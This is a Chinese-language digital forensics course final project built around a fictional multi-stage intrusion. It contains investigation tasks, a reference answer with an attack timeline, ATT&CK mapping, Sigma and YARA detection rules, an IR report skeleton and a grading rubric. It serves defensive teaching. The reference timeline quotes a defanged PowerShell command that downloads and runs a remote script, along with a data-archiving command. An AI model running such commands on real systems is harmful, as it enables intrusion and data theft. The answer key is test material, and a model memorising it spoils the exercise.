# Final Project — 完整入侵事件調查

> 目標：把全課 39 章學到的所有能力——記憶體鑑識、磁碟 artifact 分析、網路關聯、雲 IR、Threat Hunting、偵測規則工程、IR 報告——整合成一次端對端的事件調查。你從一份混合證據包出發，完整還原一場多階段入侵，對映 ATT&CK，寫出偵測規則，交出一份職業水準的報告。

---

## 情境背景（教學設計劇本）

以下是一個為教學目的設計的虛構入侵劇本，所有組織名稱、IP、雜湊值均為杜撰。

**公司**：Meridian Biotech，一家在 AWS 上運作研發環境的中型生技企業。  
**日期**：2025-07-10 至 2025-07-14（入侵週期，共五天）。  
**觸發**：07-14 週一早上，SOC 告警系統在 SIEM 出現一條 medium 告警——內部主機 `WIN-DEVBOX01`（IP `10.10.1.55`）疑似向外部 IP `185.220.101.42` 發出 beacon-like 流量，觸發 Suricata 規則 ET MALWARE 。值班分析師升級為 IR 案件，證據保全後交給你做完整調查。

**你拿到的證據包（均為教學用模擬資料，非真實案件）**：

| 編號 | 類型 | 來源 | 說明 |
|------|------|------|------|
| E-01 | 記憶體映像 | `WIN-DEVBOX01` | 16 GB RAM dump，`windevbox01.raw`（工具 winpmem，07-14 08:32 採集） |
| E-02 | 磁碟映像節選 | `WIN-DEVBOX01` | `$MFT`、`$UsnJrnl:$J`、`$LogFile` 導出；Prefetch、AMCache、ShimCache、SRUM 導出 |
| E-03 | Registry hive | `WIN-DEVBOX01` | `SYSTEM`、`SOFTWARE`、`NTUSER.DAT`（含所有使用者），AppCompatCache/RecentDocs/UserAssist/Run 全保留 |
| E-04 | Event Log | `WIN-DEVBOX01` | `Security.evtx`、`System.evtx`、`Microsoft-Windows-PowerShell%4Operational.evtx`、`Microsoft-Windows-Sysmon%4Operational.evtx` |
| E-05 | 網路 PCAP | 邊界防火牆 | `meridian-gw-20250710-20250714.pcap`（約 2 GB） |
| E-06 | Zeek log | NDR 平台 | `conn.log`、`http.log`、`dns.log`、`ssl.log`、`files.log`（同時段） |
| E-07 | CloudTrail | AWS | `us-east-1`，07-10 至 07-14，含所有 API 呼叫 |
| E-08 | GuardDuty 告警 | AWS | 同時段，JSON 格式 |
| E-09 | 側向移動目標 | `WIN-SRV01`（`10.10.1.20`） | Sysmon evtx、Security.evtx 節選（07-12 起） |

---

## 攻擊劇本速覽（給你定向，細節靠你從 artifact 還原）

這場入侵走的是標準 threat actor 劇本，共七個階段。你的任務是用手上的證據把每個階段的具體行為還原出來，而不是死背這份摘要。

1. **Initial Access**：07-10，透過 spear phishing 郵件，附件為帶巨集的 `.xlsm` 檔。
2. **Execution**：巨集觸發 PowerShell，下載第一階段 payload。
3. **Persistence**：植入 scheduled task 並修改 Run key。
4. **Privilege Escalation**：利用本地漏洞或 token impersonation 取得 SYSTEM。
5. **Credential Access**：對 LSASS 做記憶體轉儲（mimikatz 或其變體）。
6. **Lateral Movement**：用竊取的憑證透過 WMI 或 PsExec 橫移到 `WIN-SRV01`。
7. **Collection → Exfiltration**：從 `WIN-SRV01` 蒐集研發資料，壓縮後透過 HTTPS 發送到 C2。

---

## 任務規格

### 階段 1：證據保全與 Triage

在動分析之前先鎖定保全狀態。

**要做的事**：

1. 計算並記錄 E-01 至 E-09 每份證據的 SHA-256 雜湊值，確立 chain of custody（監管鏈）起點。
2. 用 Volatility3 的 `windows.info` 確認 `windevbox01.raw` 的系統資訊（OS 版本、建置號、採集時間戳）。
3. 對 Event Log 做快速 triage：統計 Security.evtx 的 Event ID 4624（登入成功）與 4625（登入失敗）在 07-10 至 07-14 的分布，找出異常時段。
4. 對 Zeek `conn.log` 做 triage：列出和外部 IP `185.220.101.42` 的所有連線，記錄最早時間戳與累積位元組數。

**交付**：
- 證據清單（編號、檔名、SHA-256、採集時間、採集工具）
- 初步 triage 摘要（2-3 段），指出你在 triage 階段就能看到的最重要異常

---

### 階段 2：記憶體鑑識——找注入與惡意進程

用 Volatility3 對 `windevbox01.raw` 做完整的記憶體分析。

**要做的事**：

1. 執行 `windows.pslist`、`windows.pstree`、`windows.cmdline` 掃出所有進程，找出父子關係異常（例如 `Excel.exe` 生出 `powershell.exe`）。
2. 執行 `windows.malfind` 找出具有可執行記憶體區域（`PAGE_EXECUTE_READWRITE`）的可疑進程。
3. 對可疑進程執行 `windows.dlllist` 確認載入的 DLL，用 `windows.memmap` + `windows.dumpfiles` 把可疑記憶體段轉儲出來，再用 YARA 掃描是否命中 shellcode 特徵。
4. 用 `windows.netscan` 找出該時間點的網路連線，對照 Zeek C2 流量。
5. 如果懷疑 LSASS 被存取，用 `windows.handles` 對 LSASS PID 查 handle 清單，確認哪個進程持有對 LSASS 的 `PROCESS_VM_READ` 權限。

**交付**：
- 可疑進程清單（PID、PPID、進程名、命令列、異常說明）
- malfind 輸出節選，標注哪些確認為惡意
- LSASS 存取關係表

**工具指令參考（示意，依 image 版本而異）**：

```bash
# 確認 image 基本資訊
python3 vol.py -f windevbox01.raw windows.info

# 進程樹
python3 vol.py -f windevbox01.raw windows.pstree

# 命令列參數
python3 vol.py -f windevbox01.raw windows.cmdline

# 可疑記憶體區域
python3 vol.py -f windevbox01.raw windows.malfind

# 網路連線
python3 vol.py -f windevbox01.raw windows.netscan

# dump 可疑進程的記憶體段
python3 vol.py -f windevbox01.raw windows.dumpfiles --pid <PID>
```

---

### 階段 3：磁碟 Artifact——建 Super Timeline

把所有磁碟層 artifact 整合成一條有時間序的攻擊軌跡。

**要做的事**：

1. 用 `MFTECmd` 解析 `$MFT` 導出 CSV，找出 07-10 至 07-14 間在非標準路徑（`%TEMP%`、`%AppData%\Roaming\`、`C:\ProgramData\` 等）新建或修改的可執行檔（`.exe`、`.dll`、`.ps1`、`.vbs`）。
2. 用 `MFTECmd` 解析 `$UsnJrnl:$J`，確認檔案的 create/rename/delete 操作序列——反鑑識行為（建立後馬上刪除）在 USN Journal 裡會留下痕跡。
3. 用 `PECmd` 解析 Prefetch，建立執行記錄時間線：找 `POWERSHELL.EXE`、`WMIC.EXE`、`PSEXEC.EXE`（或其 hash-renamed 變體）、`MIMIKATZ.EXE`（或重新命名版）的首次執行時間。
4. 用 `AppCompatCacheParser` 解析 ShimCache，補充執行時間點（注意：ShimCache 代表曾出現在磁碟，不一定代表執行）。
5. 用 `RegRipper` 或 `Registry Explorer` 對 `NTUSER.DAT` 解析 UserAssist 鍵，確認使用者互動的應用程式時間戳。
6. 解析 SRUM（`SRU\SRUDB.dat`）的網路使用量表，關聯哪個進程在 exfiltration 時段產生最大外送流量。
7. 整合上述所有時間點，產出一份 **super timeline**，格式如下：

```
2025-07-10 09:14:23  MFT-create   C:\Users\jchen\AppData\Roaming\Microsoft\Excel\invoice_Q3.xlsm
2025-07-10 09:14:31  Prefetch     EXCEL.EXE 首次執行
2025-07-10 09:15:02  Prefetch     POWERSHELL.EXE 執行（由 EXCEL.EXE 啟動，命令列含 -EncodedCommand）
...
```

**交付**：
- Super timeline（至少 20 個時間點，涵蓋 initial access 到 exfiltration）
- 發現的可疑檔案路徑與 SHA-256 雜湊（若能從磁碟映像取出）
- Registry 持久化鍵值完整路徑與內容

---

### 階段 4：網路關聯——追 C2 Beacon

從 PCAP 和 Zeek log 裡還原 C2 通訊行為。

**要做的事**：

1. 從 Zeek `conn.log` 篩出 `id.resp_h == 185.220.101.42` 的所有連線，計算 beacon interval：提取連線時間戳，算出相鄰連線的時間差，找出固定間隔（± 幾秒的 jitter 是正常的 beacon 特徵）。
2. 從 Zeek `ssl.log` 確認 TLS 指紋（JA3/JA3S）：非瀏覽器產生的 TLS 握手往往有獨特的 cipher suite 排列。
3. 從 Zeek `dns.log` 找 `conn.log` 裡 C2 IP 對應的 DNS 解析紀錄，以及任何 DGA-like 的低 TTL、高熵域名查詢（lateral movement 期間可能有額外 C2 域名）。
4. 從 Zeek `http.log` 找 07-13 至 07-14 到外部的大型 POST 請求（`request_body_len` 或 `resp_body_len` 異常大），這是 exfiltration 的信號。
5. 從 PCAP 中用 Wireshark/Tshark 提取 C2 通訊的 HTTP/HTTPS payload（若未加密），確認 User-Agent 是否偽造為合法瀏覽器（對比 Sysmon Process Network Event ID 3 看發起進程）。
6. 對 `WIN-SRV01` 側向移動時段，從 `conn.log` 找 `10.10.1.55 → 10.10.1.20` 的 SMB（445/tcp）或 WMI（135/tcp, 高動態埠）流量時間戳。

**交付**：
- C2 beacon 分析表（連線時間戳、interval 分布、平均間隔）
- TLS JA3 指紋
- Exfiltration 流量摘要（時間、目的 IP/域名、估計資料量）
- 側向移動網路時間軸

---

### 階段 5：還原完整攻擊鏈，逐步對映 ATT&CK

這是本 final 的核心。你要把前四個階段的所有發現整合成一張完整的攻擊鏈，並對映到 MITRE ATT&CK（Enterprise）的技術編號。

**格式要求**：

對每個攻擊步驟填寫：

| 欄位 | 內容 |
|------|------|
| 時間 | UTC 時間戳（從哪個 artifact 取得） |
| 行為描述 | 一句話說清楚攻擊者做了什麼 |
| ATT&CK Tactic | 戰術（Initial Access / Execution / …） |
| ATT&CK Technique | 技術編號 + 名稱（例如 T1566.001 Spearphishing Attachment） |
| 佐證 Artifact | 哪個 artifact / Event ID / log 欄位證明這件事 |
| IOC | 對應的 indicator（IP / hash / 域名 / registry key） |

**交付**：
- 完整 ATT&CK 對映表（至少涵蓋 7 個 Tactic，每個 Tactic 至少 1 個 Technique）
- 一張攻擊時間軸（文字版 kill chain 圖，從 T+0 到 T+最後操作）

---

### 階段 6：萃取 IOC，寫 Sigma / YARA 偵測規則

基於你還原的攻擊鏈，為後續防禦寫出可部署的偵測規則。

**要做的事**：

1. 從攻擊鏈萃取所有 IOC：IP、域名、雜湊值、registry key、scheduled task 名稱、User-Agent 字串、JA3 指紋等，按類型整理成 IOC 表。
2. 寫 **至少 2 條 Sigma 規則**：
   - 一條針對 Excel 生出 PowerShell 的行為（Sysmon Event ID 1，ProcessCreation 類型）
   - 一條針對 scheduled task 建立（Event ID 4698 或 Sysmon Event ID 1 `schtasks.exe /create`）
3. 寫 **至少 1 條 YARA 規則**：針對從記憶體 dump 裡找到的 shellcode 特徵（字串或 byte pattern）。
4. 說明每條規則的 **FP 分析**（False Positive 來源）與建議的 tuning 方向。
5. 說明這些規則應部署在哪個 log source，以及如何整合到 detection pipeline（Ch 11–12 的概念）。

---

### 階段 7：寫 IR 報告

依 Ch 3（PICERL）和 Ch 37（事後報告）學到的框架，產出一份完整 IR 報告。

**必要章節**：

1. **Executive Summary**（2 段）：給非技術主管看，說清楚發生什麼、影響範圍、目前狀態。
2. **Incident Timeline**：關鍵事件時間軸，來自你的 super timeline 精簡版。
3. **Impact Assessment**：受影響系統、潛在洩漏資料類型、業務影響評估。
4. **Root Cause Analysis**：初始向量（spear phishing）是怎麼成功的？哪個控制措施缺失？
5. **Containment & Eradication 記錄**：做了什麼來控制事件、清除惡意程式。
6. **ATT&CK 矩陣摘要**：視覺化呈現本次入侵涵蓋的戰術。
7. **Recommendations**：至少 5 條具體改善建議（優先順序排列，含預估實施難度）。
8. **Lessons Learned**：MTTD（平均偵測時間）、MTTR（平均回應時間）計算，以及什麼讓偵測延遲了。

---

### 階段 8：Detection Gap 改善提案

這是從「被動鑑識」升級到「主動防禦」的一步。

**要做的事**：

1. 對照 ATT&CK 對映表，找出哪些 Technique 在事件發生時沒有對應的偵測規則觸發告警（或告警在噪音中被忽略）。
2. 為每個 gap 填寫改善方案：

| ATT&CK Technique | 現有偵測？ | Gap 原因 | 改善方案 | 實施優先級 |
|------------------|----------|---------|---------|----------|
| T1059.001 PowerShell | 無 | Sysmon 未部署 | 部署 Sysmon + 對應 Sigma 規則 | 高 |
| ... | ... | ... | ... | ... |

3. 提出一個 **purple team 演練計畫**（Ch 38 的概念）：針對你找到的前三個最嚴重 gap，設計 Atomic Red Team 測試序列，驗證新規則是否有效。

---

## 驗收標準

| 階段 | 必交項目 | 達標門檻 |
|------|---------|---------|
| 1 — Triage | 證據清單 + triage 摘要 | SHA-256 全填、時間戳正確、找出至少 1 個異常 |
| 2 — 記憶體 | 可疑進程清單 + LSASS 存取表 | 正確識別注入進程、找到 LSASS 存取關係 |
| 3 — 磁碟 | Super timeline | 至少 20 個時間點、涵蓋全部七個攻擊階段 |
| 4 — 網路 | C2 beacon 分析 + exfiltration 摘要 | Beacon interval 有計算、資料量有估計 |
| 5 — ATT&CK | 完整對映表 | 至少 7 個 Tactic、每個有對應 artifact 佐證 |
| 6 — 偵測規則 | 2 條 Sigma + 1 條 YARA | 語法正確、FP 分析完整 |
| 7 — IR 報告 | 完整 8 節報告 | Executive Summary 非技術人員可讀、Recommendations 具體可行 |
| 8 — Gap 分析 | Detection gap 表 + purple team 計畫 | 至少 5 個 gap 有改善方案 |

---

## 如果你卡住了

**記憶體分析找不到可疑進程**：先用 `windows.pstree` 畫出完整進程樹，重點看 `explorer.exe` 和 Office 應用程式的子進程。正常的 `Excel.exe` 不會生出 `powershell.exe`；正常的 `powershell.exe` 不會生出 `cmd.exe` 再生出 `wmic.exe`。

**$MFT 時間戳被竄改（timestomping）**：比對 $MFT 的 `$STANDARD_INFORMATION`（SI）和 `$FILE_NAME`（FN）屬性的 MAC 時間——攻擊者通常只改 SI，FN 更難竄改（Ch 15 / Ch 33 的概念）。

**找不到 beacon 規律**：用 Python 或 Zeek 腳本對 `conn.log` 做 beacon score 計算：取同一 src-dst 對的連線時間差，算變異係數（標準差/平均值），變異係數 < 0.3 通常是 beaconing 的強信號。

**Sigma 語法不確定**：參照 [SigmaHQ/sigma](https://github.com/SigmaHQ/sigma) 的官方規則範例，特別是 `rules/windows/process_creation/` 目錄下的現有規則做對照。

**ATT&CK 編號忘了**：直接查 [attack.mitre.org](https://attack.mitre.org)，搜尋技術名稱即可。不要猜編號。

---

## 分段實作建議

對應上面 8 個階段的工作流程建議：

**週一（Day 1）**：階段 1 + 2。先做 triage 建立初始假設，再用記憶體分析驗證假設——記憶體是最不容易被攻擊者事後清除的 artifact，先做能快速確認攻擊是否仍在進行（netscan 確認活躍連線）。

**週二（Day 2）**：階段 3。磁碟 artifact 分析最花時間，但 super timeline 是後續所有工作的基礎。一邊建 timeline 一邊填 ATT&CK 草稿。

**週三（Day 3）**：階段 4 + 5。網路關聯通常能補充磁碟找不到的東西（例如 exfiltration 的目的地）。完成後把攻擊鏈全部鎖定，ATT&CK 對映定稿。

**週四（Day 4）**：階段 6 + 8。偵測規則和 gap 分析同步做——你在寫規則時自然會發現哪些 technique 沒有可用的 log source。

**週五（Day 5）**：階段 7。IR 報告用 Day 1–4 的產出整合，Executive Summary 最後寫，因為你要到最後才知道完整的 impact。

---

## 完整參考解答

**請自己做完再看。看了就剝奪了你整合全課的機會。**

<details>
<summary>點開查看參考解答（含完整攻擊鏈、ATT&CK 對映、Sigma/YARA 規則、IR 報告骨架）</summary>

---

### 設計好的攻擊鏈完整還原

以下所有工具輸出均為示意，依實際 image/樣本而異。

#### 完整攻擊時間軸

```
T+0    2025-07-10 09:14  Initial Access
       使用者 jchen@meridian.com 收到釣魚郵件，附件 invoice_Q3.xlsm
       [佐證] MFT create time: C:\Users\jchen\AppData\Roaming\Microsoft\Excel\invoice_Q3.xlsm
              Security.evtx EID 4663 (Object Access) 顯示 Excel 開啟該檔案

T+17s  2025-07-10 09:14  Execution
       Excel.exe (PID 3412) 執行 VBA 巨集，生出 PowerShell.exe
       PowerShell 命令（Base64 解碼後）：
         IEX (New-Object Net.WebClient).DownloadString('hxxps[://]185.220.101.42/stage1.ps1')
       [佐證] Sysmon EID 1: ParentImage=excel.exe, Image=powershell.exe,
              CommandLine 含 -EncodedCommand
              PowerShell/Operational EID 4104 Script Block Logging 顯示解碼後的命令

T+1m   2025-07-10 09:15  Execution（第二階段）
       stage1.ps1 下載並執行 beacon.exe 到 C:\ProgramData\WindowsDefender\svchost32.exe
       [佐證] MFT create: C:\ProgramData\WindowsDefender\svchost32.exe (07-10 09:15:44)
              Prefetch SVCHOST32.EXE-{hash}.pf 首次執行時間 09:15:48

T+3m   2025-07-10 09:18  Persistence
       svchost32.exe 建立 Scheduled Task "WindowsDefenderUpdate"，設定每 10 分鐘執行一次
       同時在 HKCU\Software\Microsoft\Windows\CurrentVersion\Run 加入同一個執行檔路徑
       [佐證] Security.evtx EID 4698 (Scheduled Task Created)
              Sysmon EID 13 (Registry Value Set): TargetObject 含 \Run\WindowsDefenderUpdate
              $UsnJrnl 顯示 schtasks.exe 執行後 Tasks 目錄有新檔案建立

T+8m   2025-07-10 09:23  C2 建立
       svchost32.exe 與 185.220.101.42:443 建立 HTTPS beacon
       Beacon interval 約 600 秒（±30 秒 jitter）
       [佐證] Zeek conn.log: 多筆 src=10.10.1.55 dst=185.220.101.42 dport=443
              間隔時間分布：588s, 612s, 595s, 623s, 601s…（示意）
              Zeek ssl.log: JA3=51a7ad14509fd614801e6af7b63d2e04（示意）

T+26h  2025-07-11 11:42  Privilege Escalation
       svchost32.exe 利用 Token Impersonation（SeImpersonatePrivilege）
       透過 PrintSpoofer / RoguePotato 類工具取得 SYSTEM token
       [佐證] Sysmon EID 1：新進程 SYSTEM context 由 svchost32.exe 生出
              Security.evtx EID 4672（特殊特權指派）出現在異常進程

T+27h  2025-07-11 12:08  Credential Access
       SYSTEM 權限下執行 mimikatz（重新命名為 WinServUpdate.exe）
       對 LSASS 做記憶體讀取，竊取多組 NTLM hash 和 Kerberos ticket
       [佐證] Sysmon EID 10（Process Access）：
              SourceImage=WinServUpdate.exe, TargetImage=lsass.exe,
              GrantedAccess=0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
              Volatility3 windows.handles 對 LSASS PID 顯示異常 handle

T+50h  2025-07-12 11:19  Lateral Movement
       用竊取的 jadmin（domain admin）NTLM hash 做 Pass-the-Hash
       透過 WMI 在 WIN-SRV01 (10.10.1.20) 遠端執行 PowerShell dropper
       [佐證] WIN-SRV01 Security.evtx EID 4624 Logon Type 3（網路登入）
              帳號 jadmin，Source IP 10.10.1.55
              WIN-SRV01 Sysmon EID 1：WmiPrvSE.exe 生出 PowerShell.exe

T+50h  2025-07-12 11:25  Collection
       WIN-SRV01 上使用 PowerShell 搜尋並壓縮研發資料
       7z.exe a C:\Windows\Temp\data.7z C:\ResearchData\ -p{password}
       [佐證] WIN-SRV01 MFT create: C:\Windows\Temp\data.7z
              Prefetch 7Z.EXE-{hash}.pf 執行時間
              SRUM 網路使用量：svchost32.exe 在 07-14 時段產生 2.3 GB 外送流量（示意）

T+98h  2025-07-14 07:44  Exfiltration
       data.7z 分段透過 HTTPS POST 上傳到 C2（同一 IP）
       [佐證] Zeek http.log：多筆 POST /upload, resp_body_len ≈ 0, request_body_len 各約 100 MB
              Zeek files.log：mime_type application/octet-stream 的大型外送檔案
              Suricata alert：ET MALWARE 觸發（本案起點告警）
```

---

### ATT&CK 完整對映表

| 時間 | 行為 | Tactic | Technique | ATT&CK ID | 佐證 Artifact |
|------|------|--------|-----------|-----------|--------------|
| 07-10 09:14 | 釣魚郵件附件 xlsm | Initial Access | Spearphishing Attachment | T1566.001 | MFT，郵件 header |
| 07-10 09:14 | VBA 巨集執行 PowerShell | Execution | Visual Basic | T1059.005 | Sysmon EID 1，PS EID 4104 |
| 07-10 09:15 | PowerShell 下載 stage2 | Execution | PowerShell | T1059.001 | PS EID 4104 Script Block |
| 07-10 09:18 | 建立 Scheduled Task | Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | Security EID 4698 |
| 07-10 09:18 | 修改 Run key | Persistence | Boot or Logon Autostart: Registry Run Keys | T1547.001 | Sysmon EID 13 |
| 07-11 11:42 | Token Impersonation 提權 | Privilege Escalation | Access Token Manipulation: Token Impersonation | T1134.001 | Security EID 4672 |
| 07-11 12:08 | 轉儲 LSASS | Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | Sysmon EID 10 |
| 07-12 11:19 | WMI 橫向移動 | Lateral Movement | Windows Management Instrumentation | T1047 | WIN-SRV01 Security EID 4624 |
| 07-12 11:19 | Pass-the-Hash | Lateral Movement | Use Alternate Authentication Material: Pass the Hash | T1550.002 | EID 4624 Logon Type 3 |
| 07-12 11:25 | 蒐集研發資料 | Collection | Data from Local System | T1005 | MFT，Prefetch |
| 07-12 11:26 | 7-Zip 壓縮 | Collection | Archive Collected Data: Archive via Utility | T1560.001 | Prefetch 7Z.EXE |
| 07-14 07:44 | HTTPS 傳輸資料 | Exfiltration | Exfiltration Over C2 Channel | T1041 | Zeek http.log，Suricata |
| 全程 | HTTPS C2 Beacon | Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Zeek conn/ssl.log |
| 全程 | 重新命名工具規避偵測 | Defense Evasion | Masquerading: Rename System Utilities | T1036.003 | MFT，Prefetch hash 比對 |

---

### Sigma 規則

**規則 1：Excel 生出 PowerShell（T1059.001 + T1566.001 組合行為）**

```yaml
title: Office Application Spawning PowerShell
id: a2b2f2c2-1234-5678-abcd-ef0123456789
status: stable
description: 偵測 Microsoft Office 應用程式（Excel、Word、Outlook）直接生出 PowerShell
    進程，這是巨集執行 payload 的強烈信號。
references:
    - https://attack.mitre.org/techniques/T1566/001/
    - https://attack.mitre.org/techniques/T1059/001/
author: blue_team_dfir_course
date: 2025/07/14
tags:
    - attack.initial_access
    - attack.execution
    - attack.t1566.001
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - '\excel.exe'
            - '\winword.exe'
            - '\outlook.exe'
            - '\powerpnt.exe'
        Image|endswith:
            - '\powershell.exe'
            - '\cmd.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
    condition: selection
falsepositives:
    - 合法的企業巨集（IT 自動化腳本透過 Excel 觸發 PowerShell）
    - 建議加入 allow-list：ParentCommandLine 含特定合法巨集路徑
level: high
```

FP 分析：主要 FP 來自 IT 自動化腳本。對策：建立已知合法巨集路徑的例外清單，並要求 IT 把合法腳本的 ParentCommandLine 特徵報備。若環境中 Office 使用者完全不應觸發 PowerShell，可升為 critical。

---

**規則 2：可疑的 Scheduled Task 建立（T1053.005）**

```yaml
title: Suspicious Scheduled Task Creation via Schtasks
id: b3c3d3e3-2345-6789-bcde-f01234567890
status: stable
description: 偵測 schtasks.exe 使用 /create 建立新排程工作，特別關注由非標準父進程
    觸發、或任務指向 TEMP/AppData/ProgramData 路徑的情況。
references:
    - https://attack.mitre.org/techniques/T1053/005/
author: blue_team_dfir_course
date: 2025/07/14
tags:
    - attack.persistence
    - attack.t1053.005
logsource:
    category: process_creation
    product: windows
detection:
    selection_schtasks:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains: '/create'
    filter_legit_paths:
        CommandLine|contains:
            - '\Windows\System32\'
            - '\Program Files\'
            - '\Program Files (x86)\'
    selection_suspicious_path:
        CommandLine|contains:
            - '\AppData\'
            - '\Temp\'
            - '\ProgramData\'
            - '\Users\Public\'
    condition: selection_schtasks and (selection_suspicious_path and not filter_legit_paths)
falsepositives:
    - 部分合法軟體安裝程式會在 ProgramData 建立任務
    - 建議結合 ParentImage 過濾：由 msiexec.exe、setup.exe 觸發的 schtasks 通常合法
level: medium
```

FP 分析：合法軟體安裝是主要 FP 來源。進一步 tuning：加入對 ParentImage 的過濾，排除已知合法安裝程式；並對任務的 `/tr`（task run）參數設定額外比對條件，鎖定指向非標準路徑的執行檔。

---

### YARA 規則

**規則：Cobalt Strike Beacon 記憶體特徵（示意，依實際 dump 樣本而異）**

```yara
rule CobaltStrike_Beacon_InMemory
{
    meta:
        description = "偵測 Cobalt Strike Beacon 在記憶體中的常見特徵字串與 shellcode 結構"
        author      = "blue_team_dfir_course"
        date        = "2025-07-14"
        reference   = "The DFIR Report: 常見 Cobalt Strike 入侵案例"
        mitre_attack = "T1055, T1071.001"

    strings:
        // Beacon 設定結構的常見 magic bytes（示意，依 image 而異）
        $cfg_magic  = { 00 01 00 01 00 02 }

        // 常見 Beacon 字串特徵
        $s1 = "ReflectivLoader" ascii wide
        $s2 = "beacon.dll" ascii wide nocase
        $s3 = "/submit.php" ascii

        // 常見的 Cobalt Strike User-Agent 偽裝
        $ua1 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MANM" ascii
        $ua2 = "Internet Explorer" ascii

        // PE 結構在記憶體中反射載入時的 MZ 特徵偏移（示意）
        $mz_relocated = { 4D 5A ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 50 45 }

    condition:
        // 記憶體掃描：包含設定 magic 且至少命中 2 個字串
        ($cfg_magic and 2 of ($s*)) or
        // 或包含反射載入的 PE 結構且有 User-Agent 偽裝
        ($mz_relocated and 1 of ($ua*))
}
```

注意：YARA 規則應先在已知乾淨環境驗證 FP 率，再部署到生產。Beacon 特徵因版本和自訂 profile 而異，建議從實際 dump 逆向提取特定樣本的 byte pattern。

---

### IR 報告骨架範例

```
================================================================================
INCIDENT RESPONSE REPORT
案件編號：IR-2025-0714-001
機密等級：CONFIDENTIAL
報告日期：2025-07-17
分析師：[姓名]
================================================================================

1. EXECUTIVE SUMMARY
-------------------
2025 年 7 月 10 日，一名 Meridian Biotech 研發部門員工（jchen）收到釣魚郵件
並開啟含惡意巨集的 Excel 附件，觸發一場持續五天的入侵。攻擊者取得域管理員
憑證後橫移至研發伺服器 WIN-SRV01，在 07-14 早上完成約 2.3 GB 研發資料的外
洩。SOC 於 07-14 08:45 根據 Suricata 告警升級此案。截至本報告，相關系統已
完成隔離，惡意程式已清除，憑證已重設，正在評估外洩資料範圍。

攻擊者在整個入侵過程中展現出清晰的 opsec 意識：使用重新命名的工具規避以
名稱為基礎的偵測，C2 beacon 偽裝為合法 HTTPS 流量，選擇持久化機制以與正
常 Windows 服務外觀融合。

2. INCIDENT TIMELINE（精簡版）
------------------------------
2025-07-10 09:14  初始入侵：釣魚郵件開啟，VBA 巨集執行
2025-07-10 09:15  第一階段 payload 下載，C2 beacon 建立
2025-07-10 09:18  持久化建立（Scheduled Task + Run key）
2025-07-11 12:08  LSASS 轉儲，域管理員憑證外洩
2025-07-12 11:19  橫向移動至 WIN-SRV01
2025-07-12 11:25  研發資料蒐集與壓縮
2025-07-14 07:44  資料外洩開始（2.3 GB 透過 HTTPS 傳出）
2025-07-14 08:45  SOC 告警觸發，IR 啟動

3. IMPACT ASSESSMENT
--------------------
受影響系統：WIN-DEVBOX01（完全淪陷）、WIN-SRV01（橫移目標）
潛在外洩資料：C:\ResearchData\ 目錄，內含研發文件、實驗數據
業務影響：[待法務/業務確認外洩資料的具體敏感度與法規義務]

4. ROOT CAUSE ANALYSIS
----------------------
直接原因：使用者開啟惡意 Office 附件並啟用巨集
控制措施缺失：
  - 缺乏 Microsoft Office 巨集執行政策（GPO 未限制巨集）
  - Sysmon 未部署（Script Block Logging 未啟用）
  - LSASS 保護（RunAsPPL）未啟用
  - 缺乏針對 Office 子進程和 LSASS 存取的告警規則

5. CONTAINMENT & ERADICATION
-----------------------------
- 07-14 09:10：隔離 WIN-DEVBOX01 和 WIN-SRV01（網路層切斷）
- 07-14 09:45：封鎖 C2 IP 185.220.101.42 於防火牆和 proxy
- 07-14 11:00：強制重設所有域管理員憑證
- 07-14 13:00：清除惡意 Scheduled Task 和 Run key
- 07-15：全面重建 WIN-DEVBOX01 和 WIN-SRV01

6. RECOMMENDATIONS（優先順序）
-------------------------------
[高 / 立即] 1. 全域部署 Sysmon，啟用 Script Block Logging（EID 4104）和 LSASS
                存取稽核（EID 10）
[高 / 立即] 2. 透過 GPO 停用 Office 巨集，或僅允許數位簽章巨集
[高 / 立即] 3. 啟用 Windows Defender Credential Guard 和 LSASS RunAsPPL
[中 / 1 個月] 4. 部署並測試針對 Office 子進程、LSASS 存取、可疑 schtasks 的
                  Sigma 規則到 SIEM
[中 / 1 個月] 5. 在郵件閘道層加強附件沙箱分析，特別針對 Office 含巨集格式

7. LESSONS LEARNED
------------------
MTTD（從初始入侵到偵測）：4 天 23 小時（不可接受）
MTTR（從偵測到初步控制）：30 分鐘（可接受）

偵測延遲的主因：
  1. Sysmon 未部署，導致 PowerShell 執行、進程生成、LSASS 存取均無告警
  2. 網路告警（Suricata）是唯一觸發點，而它直到 exfiltration 才成功比對
  3. 缺乏針對 beacon-like 流量的主動狩獵機制
```

</details>

---

## 評分表（Rubric）

| 評分維度 | 滿分 | 評分要點 |
|---------|------|---------|
| 技術正確性 | 25 | artifact 路徑正確、Event ID 正確、Volatility3 plugin 正確、工具輸出解讀準確 |
| 攻擊鏈完整性 | 20 | 七個攻擊階段全部有 artifact 佐證，時間軸邏輯自洽，無臆測未佐證的步驟 |
| ATT&CK 對映 | 20 | 至少 7 個 Tactic，Technique 編號正確（非大概），每個有對應 artifact |
| 偵測規則品質 | 20 | Sigma/YARA 語法正確可執行，FP 分析具體，有 tuning 建議 |
| IR 報告品質 | 15 | Executive Summary 非技術人員可讀，Recommendations 有優先順序且可行，MTTD/MTTR 有數字 |
| **總計** | **100** | |

加分項：
- 找到反鑑識行為（timestomping、USN Journal 操作）並佐證（+5）
- 對 AWS CloudTrail 有具體分析（+5）
- Purple team 演練計畫具體到可以直接執行（+5）

---

## 延伸挑戰

完成上面的基本任務後，可以繼續挑戰以下場景，它們對應課程後半部的深水區。

**挑戰 1：Linux 主機橫移**  
假設攻擊者從 `WIN-SRV01` 再橫移到一台 Linux Build Server（`10.10.1.30`）。你會在 `/var/log/auth.log`、`auditd` 日誌、以及 `/proc` 快照裡找什麼？對應 Ch 21-23 的方法論。

**挑戰 2：雲端 Pivot**  
攻擊者在 `WIN-SRV01` 上找到 AWS credentials（hardcoded 在某個設定檔），並用它對 AWS 做了哪些操作？從 CloudTrail 裡找：`AssumeRole`、`DescribeInstances`、`GetSecretValue` 的異常 caller IP；對應 Ch 25。

**挑戰 3：反鑑識對抗**  
